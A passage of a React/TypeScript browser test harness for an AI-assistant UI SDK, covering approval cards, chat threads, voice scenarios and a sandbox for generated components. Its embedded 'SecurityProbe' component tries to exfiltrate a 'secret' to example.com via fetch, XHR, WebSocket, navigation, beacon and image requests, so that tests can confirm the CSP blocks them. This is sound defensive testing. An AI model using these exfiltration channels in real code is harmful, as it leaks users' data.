import {
  compileWireV2,
  deriveShapeCard,
  type ApprovalDecision,
  type ApprovalRequest,
  type Json,
  type ToolOutcome,
  type Tree,
  type UIPayload,
  type VendoTheme,
} from "@vendoai/core";
import {
  VendoProvider,
  createVendoClient,
  themeCssVariables,
  useVendoTheme,
  type OpenSurface,
  type Thread,
  type ToolMetaMap,
  type VendoClient,
} from "../../src/index.js";
import {
  ActivityPanel,
  ApprovalCard,
  AutomationsPanel,
  NoPolicyNotice,
  VendoOverlay,
  VendoPage,
  VendoPalette,
  VendoSlot,
  VendoStage,
  VendoThread,
  VendoToasts,
  WaitingQueue,
  vendoToast,
  type VendoCommand,
} from "../../src/chrome/index.js";
import { AppFrame, PayloadView, TreeView } from "../../src/tree/index.js";
import { browserTreeFixture } from "../fixtures/tree.js";
import {
  realtimeVoiceDriver,
  type VoiceDriver,
  type VoiceDriverEvent,
  type VoiceDriverHandlers,
  type VoiceSessionHandle,
} from "../../src/voice/index.js";
import {
  useEffect,
  useMemo,
  useState,
  type ComponentType,
  type CSSProperties,
  type ReactNode,
} from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

const NOW = "2026-07-11T12:00:00.000Z";
const ok = async (): Promise<ToolOutcome> => ({ status: "ok", output: { accepted: true } });

const destructiveApproval: ApprovalRequest = {
  id: "apr_destructive",
  call: {
    id: "call_destructive",
    tool: "host_delete_invoice",
    args: { invoiceId: "inv_42", permanent: true },
  },
  descriptor: {
    name: "host_delete_invoice",
    description: "Permanently delete an invoice",
    inputSchema: { type: "object" },
    risk: "destructive",
    critical: true,
  },
  inputPreview: "invoiceId=inv_42\npermanent=true",
  ctx: {
    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
    venue: "app",
    presence: "present",
    appId: "app_1",
  },
  createdAt: NOW,
};

const darkTheme: Partial<VendoTheme> = {
  colors: {
    background: "#111827",
    surface: "#1f2937",
    text: "#f9fafb",
    muted: "#d1d5db",
    accent: "#38bdf8",
    accentText: "#082f49",
    danger: "#fda4af",
    border: "#64748b",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "16px" },
  radius: { small: "4px", medium: "12px", large: "24px" },
  density: "comfortable",
  motion: "reduced",
};

const loudTheme: Partial<VendoTheme> = {
  colors: {
    background: "#fff7ed",
    surface: "#ffedd5",
    text: "#3b0764",
    muted: "#6b21a8",
    accent: "#7e22ce",
    accentText: "#ffffff",
    danger: "#b91c1c",
    border: "#f97316",
  },
  typography: {
    fontFamily: "Georgia, 'Times New Roman', serif",
    headingFamily: "Impact, Haettenschweiler, sans-serif",
    baseSize: "18px",
  },
  radius: { small: "2px", medium: "20px", large: "34px" },
  density: "comfortable",
  motion: "reduced",
};

const pendingThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_pending",
    role: "assistant",
    parts: [
      { type: "text", text: "I prepared the email and need your approval before sending." },
      {
        type: "dynamic-tool",
        toolName: "host_email_send",
        toolCallId: "call_pending",
        state: "approval-requested",
        input: { to: "finance@example.com", subject: "Invoice ready" },
        approval: { id: "apr_pending" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
      },
    ],
  }],
};

/** ENG-212: a long conversation that overflows any bounded pane, ending in a
 *  pending approval — the exact "chat bricks under real content" shape measured
 *  live on Cadence /assistant. Reuses thr_1 so the wire list() adopts it. */
const boundedThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    ...Array.from({ length: 10 }, (_, index) => [
      {
        id: `msg_long_u${index}`,
        role: "user" as const,
        parts: [{ type: "text" as const, text: `Question ${index + 1}: what happened to my money this month?` }],
      },
      {
        id: `msg_long_a${index}`,
        role: "assistant" as const,
        parts: [{
          type: "text" as const,
          text: `Answer ${index + 1}: Looking at your transactions, the largest categories were groceries, `
            + "subscriptions and late-night delivery. The recurring charges add up to a meaningful share of the "
            + "month, and there are a few one-off purchases worth reviewing together before we set up any rules.",
        }],
      },
    ]).flat(),
    {
      id: "msg_long_pending",
      role: "assistant",
      parts: [
        { type: "text", text: "I prepared the email and need your approval before sending." },
        {
          type: "dynamic-tool",
          toolName: "host_email_send",
          toolCallId: "call_pending",
          state: "approval-requested",
          input: { to: "finance@example.com", subject: "Invoice ready" },
          approval: { id: "apr_pending" },
        },
        {
          type: "data-vendo-approval",
          data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
        },
      ],
    },
  ],
};

/** ENG-216 — host-supplied friendly tool metadata: labels, descriptions and a
 *  custom arg summarizer. Chips and the approval card read this over the raw
 *  slug / lifecycle string / raw JSON. */
const humanizedTools: ToolMetaMap = {
  host_send_email: { label: "Send email", description: "Send an email on the customer's behalf" },
  host_list_client_documents: { label: "Look up client documents" },
  host_transfer_funds: {
    label: "Transfer funds",
    description: "Move money between the customer's accounts",
    summarize: args => {
      const record = (args ?? {}) as { amount?: unknown; to?: unknown };
      return typeof record.amount === "number" && typeof record.to === "string"
        ? `$${record.amount.toLocaleString()} → ${record.to}`
        : undefined;
    },
  },
};

/** ENG-216 — a turn that exercises every humanization behavior at once: a chip
 *  with a host label + arg summary, a run of eight identical read chips that
 *  collapse into one ×8 entry, and a pending destructive approval whose card
 *  shows a friendly title/description and readable inputs (no fabricated ctx). */
const humanizedThread: Thread = {
  id: "thr_humanized",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_humanized",
    role: "assistant",
    parts: [
      { type: "text", text: "I reviewed the client's documents and drafted the transfer for your approval." },
      {
        type: "dynamic-tool",
        toolName: "host_send_email",
        toolCallId: "call_email",
        state: "output-available",
        input: { to: "ada@maple.example", subject: "Your statement is ready" },
        output: { ok: true },
      },
      ...Array.from({ length: 8 }, (_, index) => ({
        type: "dynamic-tool" as const,
        toolName: "host_list_client_documents",
        toolCallId: `call_doc_${index}`,
        state: "output-available" as const,
        input: { scope: "all" },
        output: { ok: true },
      })),
      {
        type: "dynamic-tool",
        toolName: "host_transfer_funds",
        toolCallId: "call_transfer",
        state: "approval-requested",
        input: { amount: 4200, currency: "USD", to: "Savings ••1234" },
        approval: { id: "apr_transfer" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_transfer", risk: "destructive", approvalId: "apr_transfer" },
      },
    ],
  }],
};

/** An in-thread app surface (VendoViewPart) whose payload carries a format no
 *  renderer is registered for — it must contain to a notice, never break the thread. */
const unknownViewThread: Thread = {
  id: "thr_unknown",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_unknown_view",
    role: "assistant",
    parts: [
      { type: "text", text: "Here is the surface from a newer runtime." },
      {
        type: "data-vendo-view",
        data: {
          appId: "app_future",
          payload: { formatVersion: "vendo-genui/v999", root: "root", nodes: [] },
        },
      },
      { type: "text", text: "The conversation keeps going past the unknown surface." },
    ],
  }],
};

function threadClient(client: VendoClient, thread: Thread): VendoClient {
  // A thread that get() serves must also appear in list(): useVendoThread only
  // adopts a supplied threadId after confirming it exists in list() (the ENG-211
  // stale-id graceful degradation guard). Stubbing get() alone would degrade the
  // thread to the empty greeting state.
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === thread.id ? thread : client.threads.get(id),
      list: async () => {
        const rest = (await client.threads.list()).filter(summary => summary.id !== thread.id);
        return [{ id: thread.id, title: thread.subject, updatedAt: thread.updatedAt }, ...rest];
      },
    },
  };
}

/** A client whose opened surface throws when the pin mount renders it — proves
 *  the VendoSlot pin boundary falls back to the original host component
 *  (06-apps §8; 08-ui §5). The throw must happen at RENDER time (the boundary
 *  only catches render errors), so the surface's `kind` getter explodes. */
function throwingOpenClient(client: VendoClient): VendoClient {
  const broken = {} as OpenSurface;
  Object.defineProperty(broken, "kind", {
    get() { throw new Error("pin mount exploded during render"); },
  });
  return {
    ...client,
    apps: { ...client.apps, open: async () => broken },
  };
}

function HostCard({ title, total, children }: { title?: string; total?: number; children?: ReactNode }) {
  return <article className="host-card"><strong>{title}</strong><div>Bound total: {total}</div>{children}</article>;
}

function Boom(): ReactNode {
  throw new Error("host render exploded inside its node boundary");
}

const components: Record<string, ComponentType> = {
  HostCard: HostCard as ComponentType,
  Boom,
};

const tree = browserTreeFixture;

const securitySource = String.raw`
import React, { useState } from "react";

export default function SecurityProbe({ label, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [xhrStatus, setXhrStatus] = useState("not run");
  const [socketStatus, setSocketStatus] = useState("not run");
  const [importStatus, setImportStatus] = useState("not run");
  const [parentStatus, setParentStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");
  const [navigateStatus, setNavigateStatus] = useState("not run");
  const [beaconStatus, setBeaconStatus] = useState("not run");
  const [imageStatus, setImageStatus] = useState("not run");
  const [expanded, setExpanded] = useState(false);

  async function probeFetch() {
    try {
      await fetch("https://example.com/probe");
      setFetchStatus("UNEXPECTED SUCCESS");
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  // XHR is a distinct API from fetch but the same connect-src directive governs it.
  function probeXhr() {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://example.com/xhr-exfil?secret=" + encodeURIComponent(label));
      xhr.onload = () => setXhrStatus("UNEXPECTED SUCCESS");
      xhr.onerror = () => setXhrStatus("FAILURE (CSP)");
      xhr.send();
    } catch {
      setXhrStatus("FAILURE (CSP)");
    }
  }

  // WebSocket construction is blocked outright by connect-src 'none' (throws).
  function probeSocket() {
    try {
      const socket = new WebSocket("wss://example.com/socket-exfil");
      socket.onopen = () => setSocketStatus("UNEXPECTED SUCCESS");
      socket.onerror = () => setSocketStatus("FAILURE (CSP)");
    } catch {
      setSocketStatus("FAILURE (CSP)");
    }
  }

  async function probeImport() {
    try {
      await import("https://example.com/mod.js");
      setImportStatus("UNEXPECTED SUCCESS");
    } catch {
      setImportStatus("FAILURE (CSP)");
    }
  }

  function probeParent() {
    try {
      void parent.document.body;
      setParentStatus("UNEXPECTED SUCCESS");
    } catch {
      setParentStatus("FAILURE (opaque origin)");
    }
  }

  // Exfiltration by navigating the jail frame itself: governed by neither
  // connect-src nor img-src nor the sandbox's form/popup flags.
  function probeNavigate() {
    try {
      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
      setNavigateStatus("navigation attempted");
    } catch {
      setNavigateStatus("FAILURE (blocked)");
    }
  }

  function probeBeacon() {
    try {
      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
    } catch {
      setBeaconStatus("FAILURE (CSP)");
    }
  }

  function probeImage() {
    const img = new Image();
    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
    img.onerror = () => setImageStatus("FAILURE (CSP)");
    img.src = "https://example.com/pixel.png?secret=1";
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section
    aria-label="Generated security probe"
    style={{ minHeight: "100vh", paddingBottom: 40 }}
  >
    <h2>{label}</h2>
    <button type="button" onClick={() => setExpanded(value => !value)}>
      {expanded ? "Collapse content" : "Expand content"}
    </button>
    <div
      aria-label="Resizable generated content"
      style={{ height: expanded ? 520 : 80, background: "linear-gradient(#dbeafe, #eff6ff)" }}
    />
    <button type="button" onClick={probeFetch}>Probe fetch</button>
    <output id="fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={probeXhr}>Probe xhr</button>
    <output id="xhr-status">xhr: {xhrStatus}</output>
    <button type="button" onClick={probeSocket}>Probe socket</button>
    <output id="socket-status">socket: {socketStatus}</output>
    <button type="button" onClick={probeImport}>Probe import</button>
    <output id="import-status">import: {importStatus}</output>
    <button type="button" onClick={probeParent}>Probe parent DOM</button>
    <output id="parent-status">parent: {parentStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch action</button>
    <output id="action-status">action: {actionStatus}</output>
    <button type="button" onClick={probeNavigate}>Probe navigate</button>
    <output id="navigate-status">navigate: {navigateStatus}</output>
    <button type="button" onClick={probeBeacon}>Probe beacon</button>
    <output id="beacon-status">beacon: {beaconStatus}</output>
    <button type="button" onClick={probeImage}>Probe image</button>
    <output id="image-status">image: {imageStatus}</output>
  </section>;
}
`;

const throwingSource = String.raw`
export default function ThrowingGeneratedComponent() {
  throw new Error("generated render exploded inside its jail");
}
`;

const emptySource = String.raw`
export default function EmptyGeneratedComponent() {
  return null;
}
`;

const furnishedPinSource = String.raw`
import { FurnishedCardBody } from "./FurnishedCardBody";

export default function FurnishedPin(props) {
  return <FurnishedCardBody {...props} />;
}
`;

const furnishedCardBodySource = String.raw`
import { FurnishedBadge } from "./FurnishedBadge";

export function FurnishedCardBody({ customer, total }) {
  return <article className="furnished-pin-card">
    <FurnishedBadge />
    <h2>Furnished fork for {customer}</h2>
    <p>Stubbed invoice total: {total}</p>
  </article>;
}
`;

const furnishedBadgeSource = String.raw`
export function FurnishedBadge() {
  return <span className="furnished-pin-badge">captured styles</span>;
}
`;

const jailTree: Tree & { furnishings: Record<string, unknown> } = {
  formatVersion: "vendo-genui/v2",
  root: "root",
  nodes: [
    { id: "root", component: "Stack", children: ["before", "furnished", "probe", "thrower", "empty", "after"] },
    { id: "before", component: "Text", props: { text: "Jail siblings before" } },
    { id: "furnished", component: "FurnishedPin", source: "generated" },
    {
      id: "probe",
      component: "SecurityProbe",
      source: "generated",
      props: {
        label: "Rendered generated props",
        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
      },
    },
    { id: "thrower", component: "ThrowingGeneratedComponent", source: "generated" },
    { id: "empty", component: "EmptyGeneratedComponent", source: "generated" },
    { id: "after", component: "Text", props: { text: "Jail sibling survived" } },
  ],
  components: {
    FurnishedPin: furnishedPinSource,
    SecurityProbe: securitySource,
    ThrowingGeneratedComponent: throwingSource,
    EmptyGeneratedComponent: emptySource,
  },
  furnishings: {
    FurnishedPin: {
      sourceImports: { "./FurnishedCardBody": "src/components/FurnishedCardBody.tsx" },
      subSources: {
        "src/components/FurnishedCardBody.tsx": {
          source: furnishedCardBodySource,
          imports: { "./FurnishedBadge": "src/components/FurnishedBadge.tsx" },
        },
        "src/components/FurnishedBadge.tsx": {
          source: furnishedBadgeSource,
          imports: {},
        },
      },
      sampleProps: { customer: "Ada", total: "$4,200" },
      styles: [{
        path: "src/app/globals.css",
        css: String.raw`
          .furnished-pin-card {
            background: rgb(239, 246, 255);
            border: 2px solid rgb(37, 99, 235);
            border-radius: 14px;
            padding: 16px;
          }
          .furnished-pin-badge {
            background: rgb(30, 64, 175);
            border-radius: 999px;
            color: white;
            display: inline-block;
            font-weight: 700;
            padding: 4px 10px;
          }
        `,
      }],
    },
  },
};

/** 06-apps §9 — the in-client venue scenario: the SAME generated source, once
 *  with a server-granted hash-pinned approval (host-page mount, host-page
 *  authority) and once with a stale approval (loud drop-back to the jail). */
const inClientSource = String.raw`
import React, { useState } from "react";

export default function PromotedCard({ customer, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");

  // In the host page this SUCCEEDS (host authority); the jail's CSP forbids it.
  async function probeFetch() {
    try {
      const response = await fetch("/frame-target.html");
      setFetchStatus(response.ok ? "SUCCESS (host authority)" : "HTTP " + response.status);
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section aria-label="Promoted in-client card" className="promoted-card">
    <h2>Promoted card for {customer}</h2>
    <button type="button" onClick={probeFetch}>Probe host fetch</button>
    <output id="inclient-fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch promoted action</button>
    <output id="inclient-action-status">action: {actionStatus}</output>
  </section>;
}
`;

function inClientTree(inClient: Record<string, unknown>): Tree {
  return {
    formatVersion: "vendo-genui/v2",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["promoted", "sibling"] },
      {
        id: "promoted",
        component: "PromotedCard",
        source: "generated",
        props: {
          customer: "Ada",
          onRun: { $action: "fn:promoted-submit", payload: { invoiceId: "inv_42" } },
        },
      },
      { id: "sibling", component: "Text", props: { text: "Host sibling survived" } },
    ],
    components: { PromotedCard: inClientSource },
    ...( { inClient } as object),
  } as Tree;
}

function InClientScenario() {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <div className="inclient-grid">
        <section aria-label="Approved in-client venue">
          <h2>Approved — host-page mount</h2>
          <TreeView
            tree={inClientTree({
              granted: true,
              versionHash: "sha256:approved",
              approvedBy: "host-console",
              at: NOW,
            })}
            components={components}
            onAction={onAction}
          />
        </section>
        <section aria-label="Stale in-client approval">
          <h2>Version changed — dropped back to the sandbox</h2>
          <TreeView
            tree={inClientTree({
              granted: false,
              versionHash: "sha256:new-version",
              reason: "version-changed",
            })}
            components={components}
            onAction={onAction}
          />
        </section>
      </div>
      <output className="recorder" data-testid="inclient-action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output>
    </TreeThemeBoundary>
  );
}

/** 06-apps §8 — the drift notice scenario: the host updated the component a
 *  pin was remixed from, so the payload carries a server-written `pinDrift`
 *  report. The surface says so loudly ABOVE the tree while the remixed fork
 *  keeps rendering in its jail — nothing changes without the user. */
const driftedPinSource = String.raw`
import React from "react";

export default function RemixedNetWorthCard() {
  return <section aria-label="Remixed net worth card" className="promoted-card">
    <h2>Net worth — remixed</h2>
    <strong>$1.2M in green</strong>
  </section>;
}
`;

function PinDriftScenario() {
  const tree: Tree = {
    formatVersion: "vendo-genui/v2",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["worth", "sibling"] },
      { id: "worth", component: "RemixedNetWorthCard", source: "generated" },
      { id: "sibling", component: "Text", props: { text: "Host sibling survived" } },
    ],
    components: { RemixedNetWorthCard: driftedPinSource },
    ...({
      pinDrift: [{
        slot: "net-worth-card",
        component: "RemixedNetWorthCard",
        baseHash: "sha256:maple-old",
        baselineHash: "sha256:maple-new",
        reason: "baseline-changed",
      }],
    } as object),
  } as Tree;
  return (
    <TreeThemeBoundary>
      <section aria-label="Drifted remixed pin">
        <h2>Host component updated under the remix</h2>
        <TreeView
          tree={tree}
          components={components}
          onAction={async () => ({ status: "ok", output: null })}
        />
      </section>
    </TreeThemeBoundary>
  );
}

class ScriptedBrowserVoiceDriver implements VoiceDriver {
  start(handlers: VoiceDriverHandlers): VoiceSessionHandle {
    let active = true;
    const emit = (event: VoiceDriverEvent) => { if (active) handlers.onEvent(event); };
    queueMicrotask(() => {
      emit({ type: "state", state: "listening" });
      emit({ type: "transcript", entry: { id: "voice-user", role: "user", text: "Show revenue", final: true } });
      emit({ type: "transcript", entry: { id: "voice-assistant", role: "assistant", text: "Revenue is ready", final: true } });
    });
    return { stop: () => { active = false; } };
  }
}

/** ENG-229 — a driver that replays an arbitrary event script, so every designed
 *  stage moment (amplitude, views, reconnect, error) is capturable. */
class ReplayVoiceDriver implements VoiceDriver {
  constructor(private readonly script: VoiceDriverEvent[], private readonly mutable = true) {}
  start(handlers: VoiceDriverHandlers): VoiceSessionHandle {
    let active = true;
    queueMicrotask(() => {
      for (const event of this.script) {
        if (active) handlers.onEvent(event);
      }
    });
    return {
      ...(this.mutable ? { setMuted: () => undefined } : {}),
      stop: () => { active = false; },
    };
  }
}

function voiceViewPayload(id: string, heading: string, body: string): UIPayload {
  return {
    formatVersion: "vendo-genui/v2",
    root: "root",
    nodes: [
      { id: "root", component: "Surface", children: ["stack"] },
      { id: "stack", component: "Stack", props: { gap: 8 }, children: [`${id}-h`, `${id}-b`] },
      { id: `${id}-h`, component: "Text", props: { text: heading, variant: "heading" } },
      { id: `${id}-b`, component: "Text", props: { text: body } },
    ],
  };
}

const VOICE_SHOWCASE_SCRIPT: VoiceDriverEvent[] = [
  { type: "state", state: "listening" },
  { type: "amplitude", level: 0.6 },
  { type: "transcript", entry: { id: "v-user", role: "user", text: "What's outstanding this week, and draft the reminders?", final: true } },
  { type: "transcript", entry: { id: "v-agent", role: "assistant", text: "Six invoices are outstanding — here's the view, and I queued the reminders for your approval.", final: true } },
  { type: "view", view: { id: "view-outstanding", appId: "app_1", payload: voiceViewPayload("v1", "Outstanding this week", "$18,420 across 6 clients") } },
  { type: "view", view: { id: "view-reminders", appId: "app_1", payload: voiceViewPayload("v2", "Reminder drafts", "3 drafts ready — sending needs your approval") } },
];

/** A client whose approvals list is empty — for the drawer capture (the drawer
 *  auto-yields to pending consent, so the wire fixture's apr_1 would close it). */
function noApprovalsClient(client: VendoClient): VendoClient {
  return { ...client, approvals: { ...client.approvals, pending: async () => [] } };
}

/** Reproduces apps/demo-bank/src/app/vendo/page.tsx: VendoThread and VendoStage
 *  mount as siblings under one bounded, scrollable flex column (Maple's /vendo
 *  tab) — the composition where the docs/verification/simplify-v2-wave2
 *  browser smoke found the voice widget could crowd out the in-conversation
 *  approval card's buttons at short viewport heights (see
 *  e2e/voice-approval-overlap.spec.ts, which drives voice active here to
 *  reproduce it). */
function ThreadVoiceStackScenario() {
  const driver = useMemo(() => new ScriptedBrowserVoiceDriver(), []);
  return (
    <VendoProvider client={threadClient(baseClient, pendingThread)} components={components} theme={mapleTheme} voice={{ driver }}>
      <div style={{ height: "calc(100vh - 96px)", minHeight: 0, display: "flex", flexDirection: "column", overflow: "auto" }}>
        <VendoThread threadId="thr_1" />
        <VendoStage />
      </div>
    </VendoProvider>
  );
}

function VoiceShowcaseScenario({ script, approvals = true, theme }: {
  script: VoiceDriverEvent[];
  approvals?: boolean;
  theme?: Partial<VendoTheme>;
}) {
  const driver = useMemo(() => new ReplayVoiceDriver(script), [script]);
  return (
    <VendoProvider
      client={approvals ? baseClient : noApprovalsClient(baseClient)}
      components={components}
      theme={theme ?? mapleTheme}
      voice={{ driver }}
    >
      <div style={{ height: 640, display: "flex", flexDirection: "column", overflow: "hidden",
        border: "1px solid var(--vendo-border)", borderRadius: 12 }}>
        <AutoOpen selector='button[aria-label="Start voice"], .fl-voice-foot button.fl-btn-primary'>
          <VendoStage />
        </AutoOpen>
      </div>
    </VendoProvider>
  );
}

function AutoOpen({ selector, children }: { selector: string; children: ReactNode }) {
  useEffect(() => {
    queueMicrotask(() => document.querySelector<HTMLElement>(selector)?.click());
  }, [selector]);
  return children;
}

function OpenPalette() {
  const [command, setCommand] = useState<VendoCommand>();
  const open = () => globalThis.dispatchEvent(new KeyboardEvent("keydown", { key: "k", ctrlKey: true, bubbles: true }));
  useEffect(() => {
    queueMicrotask(() => {
      document.querySelector<HTMLElement>("[data-testid=palette-opener]")?.focus();
      open();
    });
  }, []);
  return <><button type="button" data-testid="palette-opener" onClick={open}>Open command palette</button><VendoPalette onCommand={setCommand} /><output className="recorder" data-testid="command-recorder">{command ? JSON.stringify(command) : "No command selected"}</output></>;
}

/** ENG-222 — host-collision safety: a host input the host wires its own ⌘K to.
 *  The spec focuses it and presses ⌘K; the palette must NOT hijack the keystroke. */
function PaletteHostInputScenario() {
  return (
    <div style={{ display: "grid", gap: 12, padding: 20, maxWidth: 520 }}>
      <label style={{ display: "grid", gap: 6, fontSize: 14 }}>
        Host search field (owns ⌘K)
        <input data-testid="host-input" aria-label="Host search" placeholder="Focus me, then press ⌘K" style={{ padding: "9px 11px", borderRadius: 8, border: "1px solid #cad3e0" }} />
      </label>
      <p style={{ fontSize: 13, color: "#5b5c63" }}>
        With focus in the host field, ⌘K stays the host&rsquo;s own shortcut — the Vendo palette does not open.
      </p>
      <VendoPalette />
    </div>
  );
}

function ApprovalScenario() {
  const [decision, setDecision] = useState<ApprovalDecision>();
  const decide = async (next: ApprovalDecision) => setDecision(next);
  return decision
    ? <output className="recorder" data-testid="approval-recorder">resolved: {JSON.stringify(decision)}</output>
    : <ApprovalCard approval={destructiveApproval} onDecide={decide} />;
}

function TreeThemeBoundary({ children }: { children: ReactNode }) {
  const theme = useVendoTheme();
  return <div className="tree-theme-boundary" style={themeCssVariables(theme) as CSSProperties}>{children}</div>;
}

function TreeScenario({ jail = false }: { jail?: boolean }) {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <TreeView tree={jail ? jailTree : tree} components={components} onAction={onAction} />
      {jail ? <output className="recorder" data-testid="action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output> : null}
    </TreeThemeBoundary>
  );
}

function StageScenario() {
  const driver = useMemo(() => new ScriptedBrowserVoiceDriver(), []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <AutoOpen selector='button[aria-label="Start voice"], button'>
        <VendoStage />
      </AutoOpen>
    </VendoProvider>
  );
}

/** LIVE scenario (OPENAI_API_KEY-gated spec): the REAL realtime WebRTC driver.
 *  The ephemeral client secret arrives in the URL hash — the standing API key
 *  never reaches the browser, exactly as the driver's getSession() seam intends. */
function LiveStageScenario() {
  const driver = useMemo(() => {
    const clientSecret = decodeURIComponent(globalThis.location.hash.slice(1));
    return realtimeVoiceDriver({
      getSession: async () => ({ clientSecret }),
      instructions: "You are a terse test agent. Say 'ready' and wait.",
    });
  }, []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <VendoStage />
    </VendoProvider>
  );
}

function AppFrameScenario() {
  const cover = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='320'%3E%3Crect width='640' height='320' fill='%23ede9fe'/%3E%3Crect x='36' y='48' width='380' height='30' rx='8' fill='%238b5cf6'/%3E%3Crect x='36' y='106' width='550' height='18' rx='6' fill='%23c4b5fd'/%3E%3Crect x='36' y='145' width='490' height='18' rx='6' fill='%23ddd6fe'/%3E%3C/svg%3E";
  return (
    <div className="appframe-grid">
      <section aria-label="HTTP app frame same-origin"><h2>HTTP same-origin</h2><AppFrame surface={{ kind: "http", url: "/frame-target.html" }} /></section>
      <section aria-label="HTTP app frame cross-origin"><h2>HTTP cross-origin</h2><AppFrame surface={{ kind: "http", url: "https://app.example.com/machine" }} /></section>
      <section aria-label="Resuming app frame"><h2>Resuming</h2><AppFrame surface={{ kind: "resuming", cover }} /></section>
    </div>
  );
}

const baseClient = createVendoClient({ baseUrl: "/api/vendo" });
const unconfiguredClient = createVendoClient({ baseUrl: "/api/vendo", headers: { "x-vendo-force-posture": "unconfigured" } });

// A Maple-brand host theme (graphite accent, warm cream canvas) — the same
// brand the old shell adopted, so the landing reads like the real product.
const mapleTheme: Partial<VendoTheme> = {
  colors: {
    background: "#f3ede2", surface: "#fffdf9", text: "#14151a", muted: "#8a8b92",
    accent: "#1b1c22", accentText: "#ffffff", danger: "#b0392b", border: "rgba(20,21,26,.10)",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "15px" },
  radius: { small: "8px", medium: "12px", large: "20px" }, density: "comfortable", motion: "full",
};

/** A minimal Maple host shell (sidebar + top bar + Chat tab) so a Vendo surface
 *  renders in a realistic host context, matching the wave-2 shell's demos. */
function MapleFrame({ children }: { children: ReactNode }) {
  const navItem = (label: string, active = false) => (
    <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "8px 10px", borderRadius: 8, fontSize: 14,
      color: active ? "#14151a" : "#5b5c63", background: active ? "rgba(20,21,26,.05)" : "transparent", fontWeight: active ? 600 : 500 }}>
      <span style={{ width: 16, height: 16, borderRadius: 4, background: "currentColor", opacity: .55 }} />{label}
    </div>
  );
  const topBtn = (label: string, dark = false) => (
    <button style={{ padding: "8px 14px", borderRadius: 10, fontSize: 13.5, fontWeight: 600, cursor: "pointer",
      border: dark ? "0" : "1px solid rgba(20,21,26,.12)", background: dark ? "#14151a" : "#fff", color: dark ? "#fff" : "#14151a" }}>{label}</button>
  );
  return (
    <div style={{ display: "grid", gridTemplateColumns: "216px 1fr", height: "100%", background: "#fff", color: "#14151a",
      fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif" }}>
      <aside style={{ borderRight: "1px solid rgba(20,21,26,.08)", padding: "16px 14px", display: "flex", flexDirection: "column", gap: 4 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 9, padding: "4px 8px 16px", fontWeight: 700, fontSize: 18 }}>
          <span style={{ width: 26, height: 26, borderRadius: 8, background: "#14151a", color: "#fff", display: "grid", placeItems: "center", fontSize: 13 }}>◈</span>Maple
        </div>
        {navItem("Home")}{navItem("Accounts")}{navItem("Transactions")}{navItem("Cards")}{navItem("Payments")}{navItem("Insights")}{navItem("Ask Maple", true)}
        <div style={{ marginTop: "auto", display: "flex", flexDirection: "column", gap: 4 }}>{navItem("Activity")}{navItem("Settings")}</div>
      </aside>
      <div style={{ display: "flex", flexDirection: "column", minWidth: 0 }}>
        <header style={{ display: "flex", alignItems: "center", gap: 14, padding: "12px 22px", borderBottom: "1px solid rgba(20,21,26,.08)" }}>
          <strong style={{ fontSize: 16 }}>Ask Maple</strong>
          <div style={{ flex: 1, maxWidth: 320, display: "flex", alignItems: "center", gap: 8, padding: "7px 12px", borderRadius: 10, border: "1px solid rgba(20,21,26,.12)", color: "#8a8b92", fontSize: 13 }}>Search…<span style={{ marginLeft: "auto", fontSize: 11, border: "1px solid rgba(20,21,26,.12)", borderRadius: 5, padding: "1px 5px" }}>⌘K</span></div>
          <div style={{ marginLeft: "auto", display: "flex", gap: 8 }}>{topBtn("Send", true)}{topBtn("Request")}{topBtn("Move money")}</div>
        </header>
